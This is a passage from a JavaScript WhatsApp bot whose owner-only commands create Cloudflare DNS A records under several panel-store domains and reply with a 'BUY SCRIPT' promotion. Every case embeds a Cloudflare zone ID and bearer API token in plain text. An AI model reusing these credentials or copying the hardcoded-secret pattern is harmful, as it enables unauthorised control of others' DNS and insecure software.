                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
  
           
 case 'd10': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "15b97d8a42af1c00a70070e577ce7301";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "kiospanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break                                                                                
 
 case 'd11': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
                                                                                         case 'd12': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba364ec1df6998c10487aee2a61b7f0d";
               let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
               let tld = "moon-offc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break


case 'd13': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "84d35b1efa4fcdd32825bc887e83ba0c";
               let apitoken = "Ymf8GMTJO7AGeyMTFzoDx3d3vgW_FBiqL78b9O_S"
               let tld = "panellstore.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break


case 'd14': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2feafa10ec4054af7cb04b18515013e5";
               let apitoken = "8WA6BgIuvFO5AL3xJZf3bsM0ts8aIZiFbxj90icK"
               let tld = "tokopanellmurah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break

case 'd15': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2dc001900c742f289eef7dbae7ab784b";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "bisnispanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break


case 'd16': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb953c98b23bc7619f0e54701db07878";
               let apitoken = "ycq92Hz_KkhfnVPp-Zo83AtKIUaErg1UmkHRckm-"
               let tld = "xmartpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break


case 'd17': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "77c6588b3b36e74d07538e62ef91d6ba";
               let apitoken = "SgON4r6174fMe3h3B9wyP3caEtwUIfnVuNvSpl1k"
               let tld = "tokopanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break


case 'd18': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4049d75623d46e90d616fdf878a5ed84";
               let apitoken = "qwAWquCm1cqKEzZnZUEuAbfFq3PCOLleQZifxPog"
               let tld = "store-panel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
